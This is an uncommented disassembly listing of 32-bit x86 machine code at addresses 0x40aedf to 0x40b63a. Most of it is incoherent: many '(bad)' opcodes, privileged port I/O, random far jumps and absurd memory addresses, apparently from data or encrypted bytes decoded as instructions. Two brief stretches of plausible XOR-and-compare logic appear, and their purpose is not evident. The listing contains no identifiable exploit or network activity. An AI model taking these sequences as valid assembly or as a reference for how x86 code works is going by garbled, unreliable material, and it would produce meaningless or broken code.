  40aedf:	mov    bh,0xb
  40aee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aee2:	bound  eax,QWORD PTR ds:0x5579c255
  40aee8:	push   0xffffff8d
  40aeea:	repz sub bl,BYTE PTR [ebx+0x3bc65c3f]
  40aef1:	sbb    al,0x3e
  40aef3:	in     eax,dx
  40aef4:	jle    0x40aed1
  40aef6:	jno    0x40aedc
  40aef8:	inc    esp
  40aef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aefa:	cmovbe edi,DWORD PTR [eax]
  40aefd:	cmc    
  40aefe:	clc    
  40aeff:	inc    ebp
  40af00:	mov    edx,0xe3400ba6
  40af05:	mov    eax,ds:0x39cd06b2
  40af0a:	out    0xb1,al
  40af0c:	xchg   ebp,eax
  40af0d:	sbb    eax,0x2145ea8b
  40af12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af13:	mov    DWORD PTR [ecx+0x28],esi
  40af16:	into   
  40af17:	inc    ecx
  40af18:	inc    esp
  40af19:	and    eax,0xfeccbeca
  40af1e:	cld    
  40af1f:	pusha  
  40af20:	mov    edi,0xe555fba1
  40af25:	cli    
  40af26:	jo     0x40aee6
  40af28:	(bad)  
  40af29:	dec    eax
  40af2a:	rcl    BYTE PTR [edi],cl
  40af2c:	scas   al,BYTE PTR es:[edi]
  40af2d:	pop    edi
  40af2e:	fld    DWORD PTR ds:0xf2434fb5
  40af34:	mov    cl,0xc9
  40af36:	cli    
  40af37:	scas   eax,DWORD PTR es:[edi]
  40af38:	mov    BYTE PTR [ecx+0x1a2881fa],dl
  40af3e:	mov    esp,0xadf73a6a
  40af43:	xchg   ebx,eax
  40af44:	retf   0x2571
  40af47:	(bad)  
  40af48:	and    edx,DWORD PTR [esi+0x31]
  40af4b:	dec    eax
  40af4c:	imul   esi,DWORD PTR [edx],0xebf32a11
  40af52:	mov    bl,0x95
  40af54:	xor    ecx,DWORD PTR [ebx-0x3c]
  40af57:	dec    esp
  40af58:	mov    al,ds:0xf01ec741
  40af5d:	ins    DWORD PTR es:[edi],dx
  40af5e:	jbe    0x40af4b
  40af60:	jbe    0x40af9d
  40af62:	inc    esi
  40af63:	add    al,0x2c
  40af65:	pop    edx
  40af66:	mov    bl,0xef
  40af68:	ret    
  40af69:	pop    ecx
  40af6a:	ins    DWORD PTR es:[edi],dx
  40af6b:	(bad)  
  40af6c:	xlat   BYTE PTR ds:[ebx]
  40af6d:	cmp    DWORD PTR [ebp+0x7a],edx
  40af70:	mov    BYTE PTR ds:0x11d1370c,bh
  40af76:	sahf   
  40af77:	sub    al,0x8b
  40af7a:	fstp   TBYTE PTR [edx+ecx*8-0x5d]
  40af7e:	push   edx
  40af7f:	or     eax,esp
  40af81:	mov    edi,esi
  40af83:	mov    eax,ds:0x50cf247b
  40af88:	aad    0xb4
  40af8a:	out    0x48,eax
  40af8c:	std    
  40af8d:	aas    
  40af8e:	inc    ecx
  40af8f:	add    al,0xc3
  40af91:	not    DWORD PTR [edi]
  40af93:	out    0xfd,al
  40af95:	xchg   ebp,eax
  40af96:	lahf   
  40af97:	leave  
  40af98:	lods   al,BYTE PTR ds:[esi]
  40af99:	pop    ebp
  40af9a:	inc    edi
  40af9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9c:	xchg   BYTE PTR cs:[ebx-0x11f04f2c],cl
  40afa3:	aaa    
  40afa4:	mov    BYTE PTR [esp+ebp*1+0x1497d1fd],cl
  40afab:	cmp    edi,ebp
  40afad:	sbb    DWORD PTR [edi-0x5a],ebp
  40afb0:	repz jmp 0x1379:0x4fbb7f16
  40afb8:	mov    edi,DWORD PTR [ebp+eax*4+0x2f]
  40afbc:	pop    esp
  40afbd:	inc    eax
  40afbe:	and    esp,DWORD PTR [eax+ebp*8-0x11]
  40afc2:	pop    esp
  40afc3:	adc    BYTE PTR [edx],ah
  40afc5:	dec    ebx
  40afc6:	addr16 push esi
  40afc8:	xchg   edx,eax
  40afc9:	push   ecx
  40afca:	fwait
  40afcb:	loop   0x40b04b
  40afcd:	pop    ebp
  40afce:	mov    DWORD PTR [ebp-0xc],ebx
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     dl,BYTE PTR [ebx+0x79ba5e52]
  40affc:	call   0x7d6f2e7f
  40b001:	jle    0x40b081
  40b003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b004:	inc    edi
  40b005:	iret   
  40b006:	sahf   
  40b007:	pop    ecx
  40b008:	lea    ebx,[ecx]
  40b00a:	shl    DWORD PTR [esi+ebx*8],cl
  40b00d:	jns    0x40b046
  40b00f:	push   eax
  40b010:	lock dec edx
  40b012:	ds or  esi,ebp
  40b015:	(bad)  
  40b016:	arpl   si,di
  40b018:	or     eax,0xcf52a9ce
  40b01d:	or     esi,DWORD PTR [edx]
  40b01f:	(bad)  
  40b020:	xor    bl,BYTE PTR ds:0x15345808
  40b026:	pop    ebx
  40b027:	pop    edx
  40b028:	inc    ebp
  40b029:	pop    edx
  40b02a:	mov    eax,ds:0x41f93e02
  40b02f:	mov    bl,0x6
  40b031:	fistp  WORD PTR [esi+edi*8-0x5e1bead2]
  40b038:	sub    DWORD PTR [ecx+0x26c6fa64],0xffffff83
  40b03f:	push   ecx
  40b040:	inc    edx
  40b041:	and    al,0xd8
  40b043:	jp     0x40b016
  40b045:	retf   
  40b046:	sub    bl,BYTE PTR [eax-0x17]
  40b049:	add    dl,BYTE PTR [edx+0x56]
  40b04c:	mov    ds:0x82dd9000,al
  40b051:	cld    
  40b052:	jg     0x40b027
  40b054:	mov    bh,0xd1
  40b056:	mov    ds:0x41b1279d,al
  40b05b:	mov    WORD PTR [edx+ecx*2-0x42],cs
  40b05f:	(bad)
  40b062:	mov    dh,0x6c
  40b064:	sub    ecx,ebp
  40b066:	ins    BYTE PTR es:[edi],dx
  40b067:	add    DWORD PTR [ebp-0x46849f02],edx
  40b06d:	dec    edi
  40b06e:	xor    eax,DWORD PTR [esi-0x54593b]
  40b074:	jno    0x40b0cf
  40b076:	bnd jmp 0xd6dc052d
  40b07c:	sub    ah,BYTE PTR [edx+0x7c]
  40b07f:	pop    ds
  40b080:	dec    ecx
  40b081:	add    eax,0xf74714b4
  40b086:	add    DWORD PTR [esi],ebx
  40b088:	loop   0x40b0a2
  40b08a:	std    
  40b08b:	sub    al,BYTE PTR [edi+0x5c]
  40b08e:	in     eax,0x8d
  40b090:	scas   al,BYTE PTR es:[edi]
  40b091:	xchg   ebx,eax
  40b092:	mov    edx,es
  40b094:	push   0xa16ffafb
  40b099:	(bad)  
  40b09a:	rol    bh,1
  40b09c:	sub    eax,0x612ce3b
  40b0a1:	or     eax,0x7b3191bf
  40b0a6:	cdq    
  40b0a7:	(bad)  
  40b0a8:	mov    ebx,0x770ac5fe
  40b0ad:	in     eax,0xe3
  40b0af:	jae    0x40b072
  40b0b1:	push   esp
  40b0b2:	mov    esp,0x3850f51c
  40b0b7:	mov    ebp,0x64650451
  40b0bc:	jge    0x40b0f8
  40b0be:	cli    
  40b0bf:	out    0xb6,al
  40b0c1:	mov    ds:0xdc6bc875,al
  40b0c6:	pop    ecx
  40b0c7:	sti    
  40b0c8:	pushf  
  40b0c9:	retf   
  40b0ca:	leave  
  40b0cb:	mov    eax,ds:0x821c9b1a
  40b0d0:	arpl   cx,ax
  40b0d2:	mov    dh,0xa3
  40b0d4:	stos   BYTE PTR es:[edi],al
  40b0d5:	int3   
  40b0d6:	sbb    ecx,edi
  40b0d8:	and    bh,BYTE PTR [esi+0xa]
  40b0db:	gs ja  0x40b078
  40b0de:	in     eax,0x23
  40b0e0:	arpl   WORD PTR [edi+0x5f4285c5],bp
  40b0e6:	pop    eax
  40b0e7:	scas   al,BYTE PTR es:[edi]
  40b0e8:	cmc    
  40b0e9:	int3   
  40b0ea:	shl    dh,1
  40b0ec:	out    0x6b,eax
  40b0ee:	imul   ebp,DWORD PTR [ebx+ebp*2-0x2],0x2093ce24
  40b0f6:	rcl    DWORD PTR [ebx+0x2b70c0bf],1
  40b0fc:	lock sar BYTE PTR [edi-0x1b],1
  40b100:	mov    al,ds:0x81d42f9f
  40b105:	sar    DWORD PTR [edx+0x2e],cl
  40b108:	mov    dh,0xd8
  40b10a:	loop   0x40b0d9
  40b10c:	mov    eax,ds:0xb25138d6
  40b111:	rcr    DWORD PTR [edx-0x6a],1
  40b114:	fiadd  DWORD PTR [ebx]
  40b116:	dec    BYTE PTR [ebp-0x4d67222c]
  40b11c:	xchg   esi,eax
  40b11d:	sub    DWORD PTR [edi],edi
  40b11f:	mov    bh,0xe8
  40b121:	add    al,0xaf
  40b123:	jecxz  0x40b167
  40b125:	push   edx
  40b126:	mov    bh,0xe4
  40b128:	mov    cl,dh
  40b12a:	sti    
  40b12b:	sbb    esi,DWORD PTR [ebp-0x2d724e69]
  40b131:	mov    bl,0x8b
  40b133:	pmulhw mm4,QWORD PTR [esi+ecx*2-0x12]
  40b138:	ins    BYTE PTR es:[edi],dx
  40b139:	mov    DWORD PTR [eax],0xdf53004a
  40b13f:	arpl   WORD PTR [edx+0x27],sp
  40b142:	into   
  40b143:	cmp    DWORD PTR [ebx+0x27],0xca9be9fc
  40b14a:	mov    ebx,0x4aa870d2
  40b14f:	pop    edi
  40b150:	gs int 0x8
  40b153:	dec    ebx
  40b154:	dec    ecx
  40b155:	rcr    DWORD PTR [ebx+0x41],cl
  40b158:	sbb    dh,al
  40b15a:	ds push esp
  40b15c:	pushf  
  40b15d:	sbb    al,0xab
  40b15f:	aad    0x80
  40b161:	jbe    0x40b18a
  40b163:	mov    ah,0xa
  40b165:	add    eax,0xae65af21
  40b16a:	and    eax,DWORD PTR [ecx+ebx*8+0x2f81c151]
  40b171:	mov    ebx,0x474d3ca
  40b176:	retf   
  40b177:	aaa    
  40b178:	cwde   
  40b179:	jno    0x40b1b1
  40b17b:	jmp    0x40b1d6
  40b17d:	aad    0x1a
  40b17f:	outs   dx,DWORD PTR ds:[esi]
  40b180:	cmp    eax,0x244265eb
  40b185:	cmp    DWORD PTR [ecx-0x80],ebp
  40b188:	xor    eax,0x12679658
  40b18d:	xchg   ebp,eax
  40b18e:	(bad)  
  40b18f:	jecxz  0x40b14b
  40b191:	popf   
  40b192:	push   cs
  40b193:	fnstcw WORD PTR [ebx-0x50]
  40b196:	stos   DWORD PTR es:[edi],eax
  40b197:	(bad)  
  40b198:	mov    bh,0xa3
  40b19a:	push   esp
  40b19b:	sub    BYTE PTR [esi-0x3d3ce8dc],dh
  40b1a1:	jmp    0xfa3d:0x573c2160
  40b1a8:	jmp    0x40b142
  40b1aa:	xchg   esi,eax
  40b1ab:	mov    bh,0xd4
  40b1ad:	mov    ebp,0x306b65b0
  40b1b2:	add    dh,al
  40b1b4:	lea    edi,[eax-0xdb8c3a9]
  40b1ba:	loopne 0x40b207
  40b1bc:	cmp    DWORD PTR [esi+0x1650afcd],ebx
  40b1c2:	add    BYTE PTR [esi+0x768792df],cl
  40b1c8:	rcr    DWORD PTR [edi+0x65ec4056],1
  40b1ce:	ja     0x40b23b
  40b1d0:	ins    BYTE PTR es:[edi],dx
  40b1d1:	jns    0x40b1dd
  40b1d3:	mov    esi,0x2a4bd056
  40b1d8:	mov    al,ds:0x51b3176
  40b1dd:	adc    al,0x5d
  40b1df:	sbb    al,0xee
  40b1e1:	lods   eax,DWORD PTR ds:[esi]
  40b1e2:	iret   
  40b1e3:	dec    edi
  40b1e4:	ins    DWORD PTR es:[edi],dx
  40b1e5:	fadd   QWORD PTR ss:[edi]
  40b1e8:	mov    ds:0xb2da8748,eax
  40b1ed:	into   
  40b1ee:	push   esp
  40b1ef:	fsubr  QWORD PTR [edx+ebp*1+0x7aaf32e2]
  40b1f6:	adc    al,0x0
  40b1f8:	dec    al
  40b1fa:	jbe    0x40b272
  40b1fc:	(bad)  
  40b1fd:	ss pop esp
  40b1ff:	add    eax,DWORD PTR [esi-0x41de5af5]
  40b205:	sbb    eax,0x6ad56d68
  40b20a:	mov    ah,0x7d
  40b20c:	xor    bh,BYTE PTR [ecx+esi*2-0x7d6b5901]
  40b213:	sub    DWORD PTR [eax-0x76],ecx
  40b216:	(bad)  
  40b217:	scas   eax,DWORD PTR es:[edi]
  40b218:	ret    
  40b219:	add    BYTE PTR ds:0xc520d207,al
  40b21f:	dec    edi
  40b220:	cli    
  40b221:	in     eax,0xbf
  40b223:	xlat   BYTE PTR ds:[ebx]
  40b224:	scas   eax,DWORD PTR es:[edi]
  40b225:	test   eax,0x173e361d
  40b22a:	pop    ss
  40b22b:	mov    ebx,DWORD PTR [esi-0x43]
  40b22e:	add    dl,dl
  40b230:	cmc    
  40b231:	or     DWORD PTR [esi],eax
  40b233:	fs je  0x40b28c
  40b236:	sub    edi,DWORD PTR ds:0x31b581da
  40b23c:	jp     0x40b1de
  40b23e:	arpl   WORD PTR [edi+eiz*4],cx
  40b241:	mov    cl,0x3c
  40b243:	pop    esp
  40b244:	xchg   esp,eax
  40b245:	jo     0x40b237
  40b247:	mov    eax,0x85e47d07
  40b24c:	mov    eax,ds:0x8a0b0718
  40b251:	stos   DWORD PTR es:[edi],eax
  40b252:	fmul   st,st(2)
  40b254:	cmp    ebx,DWORD PTR [eax+0x54d3d63a]
  40b25a:	adc    DWORD PTR [ebp+0x2a7ec5fc],eax
  40b260:	js     0x40b214
  40b262:	inc    esp
  40b263:	(bad)  
  40b264:	stos   DWORD PTR es:[edi],eax
  40b265:	adc    BYTE PTR [eax+0x39],dh
  40b268:	popf   
  40b269:	pop    es
  40b26a:	xchg   ebx,eax
  40b26b:	add    eax,0x63308b02
  40b270:	rcl    ch,cl
  40b272:	add    BYTE PTR [ecx],dh
  40b274:	sbb    DWORD PTR [edi-0x6625d7ca],ebp
  40b27a:	into   
  40b27b:	jg     0x40b2d4
  40b27d:	mov    ds:0xe727682a,eax
  40b282:	pushf  
  40b283:	sbb    al,0x50
  40b285:	imul   DWORD PTR [esi-0x32a9f859]
  40b28b:	jle    0x40b273
  40b28d:	adc    ebx,esp
  40b28f:	jae    0x40b261
  40b291:	cmp    bl,BYTE PTR [ecx]
  40b293:	push   esp
  40b294:	in     eax,dx
  40b295:	pop    eax
  40b296:	addr16 inc ecx
  40b298:	bound  ebx,QWORD PTR [esi-0x677afb3a]
  40b29e:	push   0x7fa6ce69
  40b2a3:	outs   dx,BYTE PTR ds:[esi]
  40b2a4:	into   
  40b2a5:	loope  0x40b272
  40b2a7:	xor    edx,edi
  40b2a9:	repnz and esi,ebp
  40b2ac:	inc    ecx
  40b2ad:	jae    0x40b26d
  40b2af:	mov    al,0xb2
  40b2b1:	aaa    
  40b2b2:	imul   eax,esp,0x46b0a567
  40b2b8:	lods   eax,DWORD PTR ds:[esi]
  40b2b9:	xlat   BYTE PTR ds:[ebx]
  40b2ba:	jp     0x40b2ee
  40b2bc:	adc    ecx,DWORD PTR [esi+edx*1]
  40b2bf:	jbe    0x40b269
  40b2c1:	inc    ebp
  40b2c2:	cmp    al,0x61
  40b2c4:	sub    al,0x7a
  40b2c6:	stos   BYTE PTR es:[edi],al
  40b2c7:	add    edx,DWORD PTR [ecx]
  40b2c9:	hlt    
  40b2ca:	mov    DWORD PTR [esp+edi*4+0x9],esi
  40b2ce:	jo     0x40b291
  40b2d0:	xlat   BYTE PTR ds:[ebx]
  40b2d1:	nop
  40b2d2:	dec    eax
  40b2d3:	cdq    
  40b2d4:	in     al,0xa3
  40b2d6:	popf   
  40b2d7:	sub    eax,0xf9550682
  40b2dc:	int3   
  40b2dd:	aam    0x56
  40b2df:	and    ch,ch
  40b2e1:	sub    ecx,DWORD PTR [ebx]
  40b2e3:	add    ebx,DWORD PTR [ecx+0x40]
  40b2e6:	loopne 0x40b282
  40b2e8:	cmp    esp,DWORD PTR [ecx+ecx*1]
  40b2eb:	mov    ah,0x6b
  40b2ed:	mov    eax,ds:0xc554e2a8
  40b2f2:	(bad)  [ebx-0x23]
  40b2f5:	punpckhbw mm1,QWORD PTR [ecx]
  40b2f8:	and    BYTE PTR [ebp-0x5],bh
  40b2fb:	sub    eax,0xb01616b4
  40b300:	sbb    ecx,DWORD PTR [edx]
  40b302:	call   0xcd0d:0x92d1c26e
  40b309:	push   cs
  40b30a:	adc    DWORD PTR [esi-0x20],ecx
  40b30d:	push   ss
  40b30e:	pop    ebx
  40b30f:	rol    BYTE PTR [ebx+eax*1+0xf],1
  40b313:	xchg   ecx,eax
  40b314:	xchg   edx,eax
  40b315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b316:	sub    DWORD PTR [edx-0x3cdc3cb],edx
  40b31c:	sahf   
  40b31d:	rcl    DWORD PTR [edx-0xf],1
  40b320:	lea    ecx,[ebp+0x59]
  40b323:	imul   esi,DWORD PTR [esp+edi*4+0x2d2a48fd],0xe6dadb9c
  40b32e:	jge    0x40b358
  40b330:	dec    edi
  40b331:	retf   0x8bb6
  40b334:	inc    ebp
  40b335:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	xchg   esp,esi
  40b376:	ret    0x29d7
  40b379:	idiv   DWORD PTR [esi+0x7e]
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b3a3
  40b381:	mov    WORD PTR [edx+0x4e8e8a40],?
  40b387:	imul   eax,DWORD PTR ss:[esi-0x36b4e78b],0x4cdb69fa
  40b392:	adc    esp,DWORD PTR [esi+0x6466e733]
  40b398:	inc    ebp
  40b399:	icebp  
  40b39a:	and    DWORD PTR [edx],esp
  40b39c:	fmul   QWORD PTR [ecx+0x71b47d8e]
  40b3a2:	adc    DWORD PTR [ebp+0x2885f4a1],ebp
  40b3a8:	dec    ebx
  40b3a9:	sub    ecx,esp
  40b3ab:	fs icebp 
  40b3ad:	push   ecx
  40b3ae:	js     0x40b38c
  40b3b0:	push   edx
  40b3b1:	mov    ds:0xa34b3ade,eax
  40b3b6:	jmp    0xb781:0x803c1a41
  40b3bd:	(bad)  
  40b3be:	and    BYTE PTR ds:0xdd2e693f,cl
  40b3c4:	cdq    
  40b3c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3c6:	xor    al,0xcf
  40b3c8:	inc    ebp
  40b3c9:	int    0x97
  40b3cb:	push   0x7b8dc751
  40b3d0:	push   edx
  40b3d1:	sub    BYTE PTR [ebx-0x1c393b51],bl
  40b3d7:	int    0x45
  40b3d9:	sub    eax,0xd1193845
  40b3de:	cmp    al,0x80
  40b3e0:	jnp    0x40b41c
  40b3e2:	into   
  40b3e3:	ror    ecx,1
  40b3e5:	mov    ch,0xb4
  40b3e7:	and    DWORD PTR [ebp-0x134abd5b],esp
  40b3ed:	xor    BYTE PTR ds:[ebx-0x7a],bl
  40b3f1:	xchg   edx,eax
  40b3f2:	inc    edi
  40b3f3:	aam    0xdc
  40b3f5:	jmp    0x40b43c
  40b3f7:	mov    ebx,edx
  40b3f9:	ins    BYTE PTR es:[edi],dx
  40b3fa:	dec    eax
  40b3fb:	(bad)  
  40b3fc:	jo     0x40b42b
  40b3fe:	dec    ecx
  40b3ff:	xchg   ebx,eax
  40b400:	dec    al
  40b402:	fwait
  40b403:	inc    eax
  40b404:	dec    esi
  40b405:	lods   al,BYTE PTR ds:[esi]
  40b406:	mov    ah,0xfc
  40b408:	repz in eax,dx
  40b40a:	shl    DWORD PTR [ebx+0x46],1
  40b40d:	add    eax,0x2fb3a7ef
  40b412:	sbb    DWORD PTR [edi+esi*1],eax
  40b415:	popa   
  40b416:	cmp    eax,0xd1477901
  40b41b:	cld    
  40b41c:	or     BYTE PTR [edi],dl
  40b41e:	ins    BYTE PTR es:[edi],dx
  40b41f:	call   0x837f3324
  40b424:	sbb    esp,DWORD PTR [ebx+0x5e3506e3]
  40b42a:	loopne 0x40b434
  40b42c:	jmp    0x14b0:0xc567f5a1
  40b433:	cmp    BYTE PTR [ebx],bh
  40b435:	xor    edi,DWORD PTR [eax+0x68]
  40b438:	pusha  
  40b439:	jecxz  0x40b3c9
  40b43b:	dec    ebx
  40b43c:	push   ebp
  40b43d:	ret    0x5aae
  40b440:	push   ebp
  40b441:	popf   
  40b442:	lods   al,BYTE PTR ds:[esi]
  40b443:	pop    ss
  40b444:	pop    eax
  40b445:	adc    ebp,edx
  40b447:	in     eax,0x34
  40b449:	inc    esp
  40b44a:	push   edi
  40b44b:	icebp  
  40b44c:	aad    0x81
  40b44e:	push   eax
  40b44f:	ja     0x40b45f
  40b451:	ror    BYTE PTR [ecx+0x67],cl
  40b454:	in     eax,dx
  40b455:	lds    edx,FWORD PTR [ebp-0xc]
  40b458:	mov    ss,WORD PTR [eax]
  40b45a:	mov    al,ds:0x363d1a6
  40b45f:	lea    esp,[esi-0x329195c7]
  40b465:	push   cs
  40b466:	pop    ss
  40b467:	pop    ecx
  40b468:	inc    BYTE PTR [ebx-0x5b]
  40b46b:	aas    
  40b46c:	add    al,0x57
  40b46e:	in     al,dx
  40b46f:	les    esp,FWORD PTR [eax-0x5a]
  40b472:	(bad)  
  40b474:	pop    ebx
  40b475:	pop    esi
  40b476:	ds stos BYTE PTR es:[edi],al
  40b478:	jnp    0x40b4e7
  40b47a:	sub    al,0xd
  40b47c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b47d:	fcom   QWORD PTR [edx]
  40b47f:	shl    edi,cl
  40b481:	mov    esi,0xb3c8d6b1
  40b486:	sub    esp,DWORD PTR [edx-0x6f61c07]
  40b48c:	ja     0x40b468
  40b48e:	dec    ecx
  40b48f:	or     BYTE PTR [eax],al
  40b491:	mov    WORD PTR [ebp+0x3f],?
  40b494:	clc    
  40b495:	jmp    0xb4741964
  40b49a:	lods   eax,DWORD PTR ds:[esi]
  40b49b:	and    DWORD PTR [ebx+0x1b],edx
  40b49e:	les    ecx,FWORD PTR [esi+0x7]
  40b4a1:	popf   
  40b4a2:	(bad)  
  40b4a3:	(bad)  
  40b4a4:	bound  esp,QWORD PTR [ebx+0x4]
  40b4a7:	test   al,ah
  40b4a9:	jne    0x40b446
  40b4ab:	repnz lahf 
  40b4ad:	pop    ebp
  40b4ae:	ins    BYTE PTR es:[edi],dx
  40b4af:	cmc    
  40b4b0:	push   esi
  40b4b1:	lahf   
  40b4b2:	pop    es
  40b4b3:	jb     0x40b505
  40b4b5:	sub    BYTE PTR [ebx-0x4486924d],ah
  40b4bb:	in     eax,dx
  40b4bc:	fldcw  WORD PTR [esi]
  40b4be:	pop    edi
  40b4bf:	imul   DWORD PTR [edx+0x7425d066]
  40b4c5:	jb     0x40b44f
  40b4c7:	out    dx,eax
  40b4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4c9:	xor    ch,cl
  40b4cb:	jns    0x40b48b
  40b4cd:	cmp    DWORD PTR [eax-0x2ac58300],edx
  40b4d3:	pushf  
  40b4d4:	into   
  40b4d5:	jmp    0x68c822c1
  40b4da:	xchg   ebp,eax
  40b4db:	sahf   
  40b4dc:	les    eax,FWORD PTR [eax+edi*4+0x5af5c58c]
  40b4e3:	retf   0xfb80
  40b4e6:	arpl   WORD PTR [ecx],bp
  40b4e8:	jmp    0x7e06:0x25baa54c
  40b4ef:	test   DWORD PTR [edx-0x62736c3a],edi
  40b4f5:	mov    ch,al
  40b4f7:	mov    eax,ds:0xa483b02
  40b4fc:	call   0xe225246a
  40b501:	mov    bh,0x9b
  40b503:	inc    ecx
  40b504:	cmp    al,0x14
  40b506:	cmp    ebx,ebx
  40b508:	inc    ebp
  40b509:	xlat   BYTE PTR ds:[ebx]
  40b50a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b50b:	adc    DWORD PTR [edx-0x5e],esp
  40b50e:	inc    ebp
  40b50f:	stos   BYTE PTR es:[edi],al
  40b510:	add    al,0xb6
  40b512:	mov    ah,0x1f
  40b514:	mov    ah,0x71
  40b516:	adc    WORD PTR [eax+0x79b293bd],dx
  40b51d:	dec    esp
  40b51e:	js     0x40b529
  40b520:	cmp    ah,BYTE PTR [eax+0x5b]
  40b523:	mov    ds:0x2819f095,al
  40b528:	push   ebx
  40b529:	pop    eax
  40b52a:	adc    BYTE PTR [edi-0x60db09df],dh
  40b530:	inc    edx
  40b531:	adc    al,bh
  40b533:	jl     0x40b52a
  40b535:	xor    al,0xdf
  40b537:	and    eax,0x9cf0921d
  40b53c:	push   esi
  40b53d:	daa    
  40b53e:	mov    eax,ds:0xba14ca6e
  40b543:	jp     0x40b5bc
  40b545:	adc    esp,0x5435ba18
  40b54b:	fs dec ecx
  40b54d:	push   ebx
  40b54e:	int    0x28
  40b550:	adc    BYTE PTR [eax],dh
  40b552:	imul   esi,DWORD PTR [edi-0x53d03940],0x30
  40b559:	sbb    BYTE PTR [edx+0x77],0xd9
  40b55d:	jl     0x40b5a3
  40b55f:	jg     0x40b50d
  40b561:	fs sub al,0x36
  40b564:	jb     0x40b562
  40b566:	push   ds
  40b567:	sbb    esp,0xb6e7ba39
  40b56d:	jg     0x40b597
  40b56f:	rcr    si,0xde
  40b573:	clc    
  40b574:	test   BYTE PTR [esi],cl
  40b576:	push   0xffffffb8
  40b578:	sbb    BYTE PTR [ebx-0x7a],dh
  40b57b:	mov    eax,ds:0x4cd161a3
  40b580:	jno    0x40b5f5
  40b582:	mov    ebp,0x8c69da11
  40b587:	mov    ds:0x42f03267,eax
  40b58c:	nop
  40b58d:	(bad)  
  40b58e:	mov    edi,0x90705aea
  40b593:	pop    esp
  40b594:	pop    ss
  40b595:	fst    DWORD PTR [ecx-0x22cd2755]
  40b59b:	mov    bl,0xf3
  40b59d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b59e:	scas   al,BYTE PTR es:[edi]
  40b59f:	mov    ecx,ebx
  40b5a1:	adc    eax,0x9d85bc25
  40b5a6:	adc    eax,0xd91b0df0
  40b5ab:	shr    DWORD PTR [esi-0x61],0xf1
  40b5af:	test   BYTE PTR [ebx+0x7c],dh
  40b5b2:	ror    bh,0xd3
  40b5b5:	(bad)  
  40b5b6:	fwait
  40b5b7:	inc    eax
  40b5b8:	lds    bx,DWORD PTR [ecx]
  40b5bb:	jbe    0x40b61b
  40b5bd:	stc    
  40b5be:	imul   eax,DWORD PTR [eax],0x57
  40b5c1:	pop    edx
  40b5c2:	fisttp WORD PTR [edx]
  40b5c4:	(bad)  
  40b5c5:	fistp  WORD PTR [ecx+0x25a081c1]
  40b5cb:	jns    0x40b598
  40b5cd:	popf   
  40b5ce:	push   ebp
  40b5cf:	sub    al,0x63
  40b5d1:	jle    0x40b626
  40b5d3:	ins    BYTE PTR es:[edi],dx
  40b5d4:	pop    esp
  40b5d5:	mov    ch,0x8
  40b5d7:	cdq    
  40b5d8:	cmc    
  40b5d9:	xchg   esi,eax
  40b5da:	mov    DWORD PTR [ebx],esi
  40b5dc:	outs   dx,BYTE PTR ds:[esi]
  40b5dd:	mov    cl,0x3c
  40b5df:	xor    ch,BYTE PTR ds:0xac66a080
  40b5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5e6:	jae    0x40b666
  40b5e8:	push   edi
  40b5e9:	fwait
  40b5ea:	cdq    
  40b5eb:	sub    al,0x74
  40b5ed:	(bad)  
  40b5ef:	adc    al,0xb8
  40b5f1:	jnp    0x40b648
  40b5f3:	clc    
  40b5f4:	sbb    BYTE PTR [ebx-0x72],bh
  40b5f7:	or     al,0x56
  40b5f9:	dec    BYTE PTR [ebp+0x72379747]
  40b5ff:	data16 mov BYTE PTR [ecx+ecx*2+0x4f],0x2a
  40b605:	mov    WORD PTR [ebx+0x5393a675],?
  40b60b:	push   ss
  40b60c:	push   0x3dbf355b
  40b611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b612:	pop    ecx
  40b613:	mov    esp,0x7f9adc7
  40b618:	repz pop ebx
  40b61a:	sbb    eax,0x1ec33f03
  40b61f:	xchg   BYTE PTR [edi],ch
  40b621:	add    al,BYTE PTR [edx-0x30]
  40b624:	adc    BYTE PTR [edx],0x8
  40b627:	and    al,dh
  40b629:	cmp    ebx,DWORD PTR [ebx+edi*8-0x12]
  40b62d:	xor    eax,0xd38ad43e
  40b632:	pop    ecx
  40b633:	popa   
  40b634:	stos   BYTE PTR es:[edi],al
  40b635:	ins    BYTE PTR es:[edi],dx
  40b636:	pop    ebp
  40b637:	inc    ebp
  40b638:	push   edi
  40b639:	outs   dx,BYTE PTR ds:[esi]
  40b63a:	push   0x63d8c665
